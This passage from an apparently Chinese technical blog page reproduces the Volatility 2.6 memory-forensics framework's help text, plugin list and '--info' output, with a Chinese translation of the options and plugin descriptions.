key</span><br><span class="line">                shutdowntime    Print ShutdownTime of machine from registry</span><br><span class="line">                sockets         Print list of open sockets</span><br><span class="line">                sockscan        Pool scanner for tcp socket objects</span><br><span class="line">                ssdt            Display SSDT entries</span><br><span class="line">                strings         Match physical offsets to virtual addresses (may take a while, VERY verbose)</span><br><span class="line">                svcscan         Scan for Windows services</span><br><span class="line">                symlinkscan     Pool scanner for symlink objects</span><br><span class="line">                thrdscan        Pool scanner for thread objects</span><br><span class="line">                threads         Investigate _ETHREAD and _KTHREADs</span><br><span class="line">                timeliner       Creates a timeline from various artifacts in memory </span><br><span class="line">                timers          Print kernel timers and associated module DPCs</span><br><span class="line">                truecryptmaster Recover TrueCrypt 7.1a Master Keys</span><br><span class="line">                truecryptpassphrase     TrueCrypt Cached Passphrase Finder</span><br><span class="line">                truecryptsummary        TrueCrypt Summary</span><br><span class="line">                unloadedmodules Print list of unloaded modules</span><br><span class="line">                userassist      Print userassist registry keys and information</span><br><span class="line">                userhandles     Dump the USER handle tables</span><br><span class="line">                vaddump         Dumps out the vad sections to a file</span><br><span class="line">                vadinfo         Dump the VAD info</span><br><span class="line">                vadtree         Walk the VAD tree and display in tree format</span><br><span class="line">                vadwalk         Walk the VAD tree</span><br><span class="line">                vboxinfo        Dump virtualbox information</span><br><span class="line">                verinfo         Prints out the version information from PE images</span><br><span class="line">                vmwareinfo      Dump VMware VMSS/VMSN information</span><br><span class="line">                volshell        Shell in the memory image</span><br><span class="line">                windows         Print Desktop Windows (verbose details)</span><br><span class="line">                wintree         Print Z-Order Desktop Windows Tree</span><br><span class="line">                wndscan         Pool scanner for window stations</span><br><span class="line">                yarascan        Scan process or kernel memory with Yara signatures</span><br></pre></td></tr></table></figure><h5 id="中文"><a href="#中文" class="headerlink" title="中文"></a>中文</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">用法： Volatility - 内存取证分析平台</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -h, --help            列出所有可用选项及其默认值</span><br><span class="line">                        默认值可以在配置文件中设置</span><br><span class="line">                        (/etc/volatilityrc)</span><br><span class="line">  --conf-file=/home/kali/.volatilityrc</span><br><span class="line">                        基于用户的配置文件</span><br><span class="line">  -d, --debug           调试Volatility</span><br><span class="line">  --plugins=PLUGINS     要使用的其他插件目录（冒号分隔）</span><br><span class="line">  --info                打印所有注册对象的信息</span><br><span class="line">  --cache-directory=/home/kali/.cache/volatility</span><br><span class="line">                        存放缓存文件的目录</span><br><span class="line">  --cache               使用缓存</span><br><span class="line">  --tz=TZ               设置 (Olson) 时区以使用 pytz（如果已安装）或 tzset 显示时间戳</span><br><span class="line">  -f FILENAME, --filename=FILENAME</span><br><span class="line">                        打开图像时使用的文件名</span><br><span class="line">  --profile=WinXPSP2x86</span><br><span class="line">                        要加载的配置文件的名称（使用 --info 查看支持的配置文件列表）</span><br><span class="line">  -l LOCATION, --location=LOCATION</span><br><span class="line">                        从中加载地址空间的 URN 位置</span><br><span class="line">  -w, --write           启用写支持</span><br><span class="line">  --dtb=DTB             DTB 地址</span><br><span class="line">  --shift=SHIFT         Mac KASLR 移位地址</span><br><span class="line">  --output=text         以这种格式输出（支持特定于模块，请参阅下面的模块输出选项）</span><br><span class="line">  --output-file=OUTPUT_FILE</span><br><span class="line">                        在此文件中写入输出</span><br><span class="line">  -v, --verbose         详细信息</span><br><span class="line">  -g KDBG, --kdbg=KDBG  指定一个 KDBG 虚拟地址（注意：对于 64 位 Windows 8 及更高版本，这是 KdCopyDataBlock 的地址）</span><br><span class="line">  --force               强制使用可疑配置文件</span><br><span class="line">  -k KPCR, --kpcr=KPCR  指定特定的 KPCR 地址</span><br><span class="line">  --cookie=COOKIE       指定 nt!ObHeaderCookie 的地址（仅适用于 Windows 10）</span><br><span class="line"></span><br><span class="line">支持的插件命令:</span><br><span class="line"></span><br><span class="line">amcache        查看AmCache应用程序痕迹信息</span><br><span class="line">apihooks       检测内核及进程的内存空间中的API hook</span><br><span class="line">atoms          列出会话及窗口站atom表</span><br><span class="line">atomscan       Atom表的池扫描(Pool scanner)</span><br><span class="line">auditpol       列出注册表HKLMSECURITYPolicyPolAdtEv的审计策略信息</span><br><span class="line">bigpools       使用BigPagePoolScanner转储大分页池(big page pools)</span><br><span class="line">bioskbd        从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出BIOS开机密码)</span><br><span class="line">cachedump      获取内存中缓存的域帐号的密码哈希</span><br><span class="line">callbacks      打印全系统通知例程</span><br><span class="line">clipboard      提取Windows剪贴板中的内容</span><br><span class="line">cmdline        显示进程命令行参数</span><br><span class="line">cmdscan        提取执行的命令行历史记录（扫描_COMMAND_HISTORY信息）</span><br><span class="line">connections    打印系统打开的网络连接(仅支持Windows XP 和2003)</span><br><span class="line">connscan       打印TCP连接信息</span><br><span class="line">consoles       提取执行的命令行历史记录（扫描_CONSOLE_INFORMATION信息）</span><br><span class="line">crashinfo      提取崩溃转储信息</span><br><span class="line">deskscan       tagDESKTOP池扫描(Poolscaner)</span><br><span class="line">devicetree     显示设备树信息</span><br><span class="line">dlldump        从进程地址空间转储动态链接库</span><br><span class="line">dlllist        打印每个进程加载的动态链接库列表</span><br><span class="line">driverirp      IRP hook驱动检测</span><br><span class="line">drivermodule   关联驱动对象至内核模块</span><br><span class="line">driverscan     驱动对象池扫描</span><br><span class="line">dumpcerts      提取RAS私钥及SSL公钥</span><br><span class="line">dumpfiles      提取内存中映射或缓存的文件</span><br><span class="line">dumpregistry   转储内存中注册表信息至磁盘</span><br><span class="line">editbox        查看Edit编辑控件信息 (Listbox正在实验中)</span><br><span class="line">envars         显示进程的环境变量</span><br><span class="line">eventhooks     打印Windows事件hook详细信息</span><br><span class="line">evtlogs        提取Windows事件日志（仅支持XP/2003)</span><br><span class="line">filescan       提取文件对象（file objects）池信息</span><br><span class="line">gahti          转储用户句柄（handle）类型信息</span><br><span class="line">gditimers      打印已安装的GDI计时器(timers)及回调(callbacks)</span><br><span class="line">gdt            显示全局描述符表(Global Deor Table)</span><br><span class="line">getservicesids 获取注册表中的服务名称并返回SID信息</span><br><span class="line">getsids        打印每个进程的SID信息</span><br><span class="line">handles        打印每个进程打开的句柄的列表</span><br><span class="line">hashdump       转储内存中的Windows帐户密码哈希(LM/NTLM)</span><br><span class="line">hibinfo        转储休眠文件信息</span><br><span class="line">hivedump       打印注册表配置单元信息</span><br><span class="line">hivelist       打印注册表配置单元列表</span><br><span class="line">hivescan       注册表配置单元池扫描</span><br><span class="line">hpakextract    从HPAK文件（Fast Dump格式）提取物理内存数据</span><br><span class="line">hpakinfo       查看HPAK文件属性及相关信息</span><br><span class="line">idt            显示中断描述符表(Interrupt Deor Table)</span><br><span class="line">iehistory      重建IE缓存及访问历史记录</span><br><span class="line">imagecopy      将物理地址空间导出原生DD镜像文件</span><br><span class="line">imageinfo      查看/识别镜像信息</span><br><span class="line">impscan        扫描对导入函数的调用</span><br><span class="line">joblinks       打印进程任务链接信息</span><br><span class="line">kdbgscan       搜索和转储潜在KDBG值</span><br><span class="line">kpcrscan       搜索和转储潜在KPCR值</span><br><span class="line">ldrmodules     检测未链接的动态链接DLL</span><br><span class="line">lsadump        从注册表中提取LSA密钥信息（已解密）</span><br><span class="line">machoinfo      转储Mach-O 文件格式信息</span><br><span class="line">malfind        查找隐藏的和插入的代码</span><br><span class="line">mbrparser      扫描并解析潜在的主引导记录(MBR)</span><br><span class="line">memdump        转储进程的可寻址内存</span><br><span class="line">memmap         打印内存映射</span><br><span class="line">messagehooks   桌面和窗口消息钩子的线程列表</span><br><span class="line">mftparser      扫描并解析潜在的MFT条目</span><br><span class="line">moddump        转储内核驱动程序到可执行文件的示例</span><br><span class="line">modscan        内核模块池扫描</span><br><span class="line">modules        打印加载模块的列表</span><br><span class="line">multiscan      批量扫描各种对象</span><br><span class="line">mutantscan     对互斥对象池扫描</span><br><span class="line">notepad        查看记事本当前显示的文本</span><br><span class="line">objtypescan    扫描窗口对象类型对象</span><br><span class="line">patcher        基于页面扫描的补丁程序内存</span><br><span class="line">poolpeek       可配置的池扫描器插件</span><br><span class="line">printkey       打印注册表项及其子项和值</span><br><span class="line">privs          显示进程权限</span><br><span class="line">procdump       进程转储到一个可执行文件示例</span><br><span class="line">pslist         按照EPROCESS列表打印所有正在运行的进程</span><br><span class="line">psscan         进程对象池扫描</span><br><span class="line">pstree         以树型方式打印进程列表</span><br><span class="line">psxview        查找带有隐藏进程的所有进程列表</span><br><span class="line">qemuinfo       转储 Qemu 信息</span><br><span class="line">raw2dmp        将物理内存原生数据转换为windbg崩溃转储格式</span><br><span class="line">screenshot     基于GDI Windows的虚拟屏幕截图保存</span><br><span class="line">servicediff    Windows服务列表(ala Plugx)</span><br><span class="line">sessions       _MM_SESSION_SPACE的详细信息列表(用户登录会话)</span><br><span class="line">shellbags      打印Shellbags信息</span><br><span class="line">shimcache      解析应用程序兼容性Shim缓存注册表项</span><br><span class="line">shutdowntime   从内存中的注册表信息获取机器关机时间</span><br><span class="line">sockets        打印已打开套接字列表</span><br><span class="line">sockscan       TCP套接字对象池扫描</span><br><span class="line">ssdt           显示SSDT条目</span><br><span class="line">strings        物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)</span><br><span class="line">svcscan        Windows服务列表扫描</span><br><span class="line">symlinkscan    符号链接对象池扫描</span><br><span class="line">thrdscan       线程对象池扫描</span><br><span class="line">threads        调查_ETHREAD 和_KTHREADs</span><br><span class="line">timeliner      创建内存中的各种痕迹信息的时间线</span><br><span class="line">timers         打印内核计时器及关联模块的DPC</span><br><span class="line">truecryptmasterRecover 恢复TrueCrypt 7.1a主密钥</span><br><span class="line">truecryptpassphrase查找并提取TrueCrypt密码</span><br><span class="line">truecryptsummaryTrueCrypt摘要信息</span><br><span class="line">unloadedmodules打印卸载的模块信息列表</span><br><span class="line">userassist     打印注册表中UserAssist相关信息</span><br><span class="line">userhandles    转储用户句柄表</span><br><span class="line">vaddump        转储VAD数据为文件</span><br><span class="line">vadinfo        转储VAD信息</span><br><span class="line">vadtree        以树形方式显示VAD树信息</span><br><span class="line">vadwalk        显示遍历VAD树</span><br><span class="line">vboxinfo       转储Virtualbox信息（虚拟机）</span><br><span class="line">verinfo        打印PE镜像中的版本信息</span><br><span class="line">vmwareinfo     转储VMware VMSS/VMSN 信息</span><br><span class="line">volshell       内存镜像中的shell</span><br><span class="line">windows        打印桌面窗口(详细信息)</span><br><span class="line">wintree        Z顺序打印桌面窗口树</span><br><span class="line">wndscan        池扫描窗口站</span><br><span class="line">yarascan       以Yara签名扫描进程或内核内存</span><br></pre></td></tr></table></figure><h4 id="插件信息查询"><a href="#插件信息查询" class="headerlink" title="插件信息查询"></a>插件信息查询</h4><p>输入<code> volatility_2.6 --info</code>可查看插件。</p><h5 id="英文-1"><a href="#英文-1" class="headerlink" title="英文"></a>英文</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br></pre></td><td class="code"><pre><span class="line">└─$ volatility_2.6 --info</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Profiles</span><br><span class="line">--------</span><br><span class="line">VistaSP0x64           - A Profile for Windows Vista SP0 x64</span><br><span class="line">VistaSP0x86           - A Profile for Windows Vista SP0 x86</span><br><span class="line">VistaSP1x64           - A Profile for Windows Vista SP1 x64</span><br><span class="line">VistaSP1x86           - A Profile for Windows Vista SP1 x86</span><br><span class="line">VistaSP2x64           - A Profile for Windows Vista SP2 x64</span><br><span class="line">VistaSP2x86           - A Profile for Windows Vista SP2 x86</span><br><span class="line">Win10x64              - A Profile for Windows 10 x64</span><br><span class="line">Win10x64_10586        - A Profile for Windows 10 x64 (10.0.10586.306 / 2016-04-23)</span><br><span class="line">Win10x64_14393        - A Profile for Windows 10 x64 (10.0.14393.0 / 2016-07-16)</span><br><span class="line">Win10x86              - A Profile for Windows 10 x86</span><br><span class="line">Win10x86_10586        - A Profile for Windows 10 x86 (10.0.10586.420 / 2016-05-28)</span><br><span class="line">Win10x86_14393        - A Profile for Windows 10 x86 (10.0.14393.0 / 2016-07-16)</span><br><span class="line">Win2003SP0x86         - A Profile for Windows 2003 SP0 x86</span><br><span class="line">Win2003SP1x64         - A Profile for Windows 2003 SP1 x64</span><br><span class="line">Win2003SP1x86         - A Profile for Windows 2003 SP1 x86</span><br><span class="line">Win2003SP2x64         - A Profile for Windows 2003 SP2 x64</span><br><span class="line">Win2003SP2x86         - A Profile for Windows 2003 SP2 x86</span><br><span class="line">Win2008R2SP0x64       - A Profile for Windows 2008 R2 SP0 x64</span><br><span class="line">Win2008R2SP1x64       - A Profile for Windows 2008 R2 SP1 x64</span><br><span class="line">Win2008R2SP1x64_23418 - A Profile for Windows 2008 R2 SP1 x64 (6.1.7601.23418 / 2016-04-09)</span><br><span class="line">Win2008SP1x64         - A Profile for Windows 2008 SP1 x64</span><br><span class="line">Win2008SP1x86         - A Profile for Windows 2008 SP1 x86</span><br><span class="line">Win2008SP2x64         - A Profile for Windows 2008 SP2 x64</span><br><span class="line">Win2008SP2x86         - A Profile for Windows 2008 SP2 x86</span><br><span class="line">Win2012R2x64          - A Profile for Windows Server 2012 R2 x64</span><br><span class="line">Win2012R2x64_18340    - A Profile for Windows Server 2012 R2 x64 (6.3.9600.18340 / 2016-05-13)</span><br><span class="line">Win2012x64            - A Profile for Windows Server 2012 x64</span><br><span class="line">Win2016x64_14393      - A Profile for Windows Server 2016 x64 (10.0.14393.0 / 2016-07-16)</span><br><span class="line">Win7SP0x64            - A Profile for Windows 7 SP0 x64</span><br><span class="line">Win7SP0x86            - A Profile for Windows 7 SP0 x86</span><br><span class="line">Win7SP1x64            - A Profile for Windows 7 SP1 x64</span><br><span class="line">Win7SP1x64_23418      - A Profile for Windows 7 SP1 x64 (6.1.7601.23418 / 2016-04-09)</span><br><span class="line">Win7SP1x86            - A Profile for Windows 7 SP1 x86</span><br><span class="line">Win7SP1x86_23418      - A Profile for Windows 7 SP1 x86 (6.1.7601.23418 / 2016-04-09)</span><br><span class="line">Win81U1x64            - A Profile for Windows 8.1 Update 1 x64</span><br><span class="line">Win81U1x86            - A Profile for Windows 8.1 Update 1 x86</span><br><span class="line">Win8SP0x64            - A Profile for Windows 8 x64</span><br><span class="line">Win8SP0x86            - A Profile for Windows 8 x86</span><br><span class="line">Win8SP1x64            - A Profile for Windows 8.1 x64</span><br><span class="line">Win8SP1x64_18340      - A Profile for Windows 8.1 x64 (6.3.9600.18340 / 2016-05-13)</span><br><span class="line">Win8SP1x86            - A Profile for Windows 8.1 x86</span><br><span class="line">WinXPSP1x64           - A Profile for Windows XP SP1 x64</span><br><span class="line">WinXPSP2x64           - A Profile for Windows XP SP2 x64</span><br><span class="line">WinXPSP2x86           - A Profile for Windows XP SP2 x86</span><br><span class="line">WinXPSP3x86           - A Profile for Windows XP SP3 x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Address Spaces</span><br><span class="line">--------------</span><br><span class="line">AMD64PagedMemory              - Standard AMD 64-bit address space.</span><br><span class="line">ArmAddressSpace               - Address space for ARM processors</span><br><span class="line">FileAddressSpace              - This is a direct file AS.</span><br><span class="line">HPAKAddressSpace              - This AS supports the HPAK format</span><br><span class="line">IA32PagedMemory               - Standard IA-32 paging address space.</span><br><span class="line">IA32PagedMemoryPae            - This class implements the IA-32 PAE paging address space. It is responsible</span><br><span class="line">LimeAddressSpace              - Address space for Lime</span><br><span class="line">LinuxAMD64PagedMemory         - Linux-specific AMD 64-bit address space.</span><br><span class="line">MachOAddressSpace             - Address space for mach-o files to support atc-ny memory reader</span><br><span class="line">OSXPmemELF                    - This AS supports VirtualBox ELF64 coredump format</span><br><span class="line">QemuCoreDumpElf               - This AS supports Qemu ELF32 and ELF64 coredump format</span><br><span class="line">VMWareAddressSpace            - This AS supports VMware snapshot (VMSS) and saved state (VMSS) files</span><br><span class="line">VMWareMetaAddressSpace        - This AS supports the VMEM format with VMSN/VMSS metadata</span><br><span class="line">VirtualBoxCoreDumpElf64       - This AS supports VirtualBox ELF64 coredump format</span><br><span class="line">Win10AMD64PagedMemory         - Windows 10-specific AMD 64-bit address space.</span><br><span class="line">WindowsAMD64PagedMemory       - Windows-specific AMD 64-bit address space.</span><br><span class="line">WindowsCrashDumpSpace32       - This AS supports windows Crash Dump format</span><br><span class="line">WindowsCrashDumpSpace64       - This AS supports windows Crash Dump format</span><br><span class="line">WindowsCrashDumpSpace64BitMap - This AS supports Windows BitMap Crash Dump format</span><br><span class="line">WindowsHiberFileSpace32       - This is a hibernate address space for windows hibernation files.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Plugins</span><br><span class="line">-------</span><br><span class="line">amcache                    - Print AmCache information</span><br><span class="line">apihooks                   - Detect API hooks in process and kernel memory</span><br><span class="line">atoms                      - Print session and window station atom tables</span><br><span class="line">atomscan                   - Pool scanner for atom tables</span><br><span class="line">auditpol                   - Prints out the Audit Policies from HKLM\SECURITY\Policy\PolAdtEv</span><br><span class="line">bigpools                   - Dump the big page pools using BigPagePoolScanner</span><br><span class="line">bioskbd                    - Reads the keyboard buffer from Real Mode memory</span><br><span class="line">cachedump                  - Dumps cached domain hashes from memory</span><br><span class="line">callbacks                  - Print system-wide notification routines</span><br><span class="line">clipboard                  - Extract the contents of the windows clipboard</span><br><span class="line">cmdline                    - Display process command-line arguments</span><br><span class="line">cmdscan                    - Extract command history by scanning for _COMMAND_HISTORY</span><br><span class="line">connections                - Print list of open connections [Windows XP and 2003 Only]</span><br><span class="line">connscan                   - Pool scanner for tcp connections</span><br><span class="line">consoles                   - Extract command history by scanning for _CONSOLE_INFORMATION</span><br><span class="line">crashinfo                  - Dump crash-dump information</span><br><span class="line">deskscan                   - Poolscaner for tagDESKTOP (desktops)</span><br><span class="line">devicetree                 - Show device tree</span><br><span class="line">dlldump                    - Dump DLLs from a process address space</span><br><span class="line">dlllist                    - Print list of loaded dlls for each process</span><br><span class="line">driverirp                  - Driver IRP hook detection</span><br><span class="line">drivermodule               - Associate driver objects to kernel modules</span><br><span class="line">driverscan                 - Pool scanner for driver objects</span><br><span class="line">dumpcerts                  - Dump RSA private and public SSL keys</span><br><span class="line">dumpfiles                  - Extract memory mapped and cached files</span><br><span class="line">dumpregistry               - Dumps registry files out to disk</span><br><span class="line">editbox                    - Displays information about Edit controls. (Listbox experimental.)</span><br><span class="line">envars                     - Display process environment variables</span><br><span class="line">eventhooks                 - Print details on windows event hooks</span><br><span class="line">evtlogs                    - Extract Windows Event Logs (XP/2003 only)</span><br><span class="line">filescan                   - Pool scanner for file objects</span><br><span class="line">gahti                      - Dump the USER handle type information</span><br><span class="line">gditimers                  - Print 